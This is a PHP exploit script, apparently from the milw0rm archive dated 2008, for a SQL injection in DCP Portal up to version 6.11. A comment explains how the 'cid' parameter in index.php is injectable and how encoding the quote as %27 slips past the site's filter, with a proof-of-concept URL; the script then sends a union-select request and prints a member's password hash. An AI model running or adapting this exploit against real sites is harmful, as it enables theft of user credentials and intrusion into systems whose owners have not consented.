#!/usr/bin/php -q
<?php
echo "[*]DCP Portal <= 6.11 Remote SQL Injection Exploit\r\n";
echo "[*]Coded by x0kster -x0kster[AT]gmail[DOT]com - \r\n";
/*
Note : Magic Quotes = 0
Script Download : http://www.dcp-portal.org/

Bug in index.php :

     <?php
     //index.php
     [...]
 60.  $sql = "SELECT id, name FROM $t_cats WHERE cat_id = '".$_GET["cid"]."' ORDER BY sort, name";
     [...]
     ?>
     
But the script filter the quotes with this code, included in each page of the cms:
   
     <?php
     //config/config.inc.php
     [...]
118.  if (strlen($_SERVER['QUERY_STRING']) > 0) {  
119.  $str = $_SERVER['QUERY_STRING'];  
120.  $arr = split('[;&]', URLdecode($str));  
121.  $pos = strpos($str, "'");  
122.  if ($pos) {    
123.  $hackattempt = true;  }  
     [...]
     ?>
     
But we can bypass this control using %27 instead ' :-).

So this is the simple PoC:
http://site/path/index.php?cid=-1%27+union+select+1,password+from+dcp5_members+where+uid=1/*
 
Exploit :
*/
if ($argc<4) {
 echo "[*]Usage: php ".$argv[0]." host path id\r\n";
 echo "[*]Example:\r\n";
 echo "[*]php ".$argv[0]." localhost /dcp-portal/ 1\r\n";
 die;
}

function get_response($packet){
 global $host, $response;
 $socket=fsockopen(gethostbyname($host),80);
 if (!$socket) { echo "[-]Error contacting $host.\r\n"; exit();}
 fputs($socket,$packet);
 $response='';
 while (!feof($socket)) {
  $response.=fgets($socket);
    }
 fclose($socket);
}

$host =$argv[1];
$path =$argv[2];
$id = $argv[3];
 
$packet ="GET ".$path."index.php?cid=-1%27+union+select+1,concat(0x78306b73746572,password,0x78306b73746572)+from+dcp5_members+where+uid=".$id."/*";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";

get_response($packet);
if(strstr($response,"x0kster")){
	$hash = explode("x0kster",$response,32);
	echo "[+]Ok, the hash is : $hash[1]\r\n";
	die;
}else{
	echo "[-]Exploit filed, maybe fixed or incorrect id.\r\n";
	die;
}    

?>

# milw0rm.com [2008-01-06]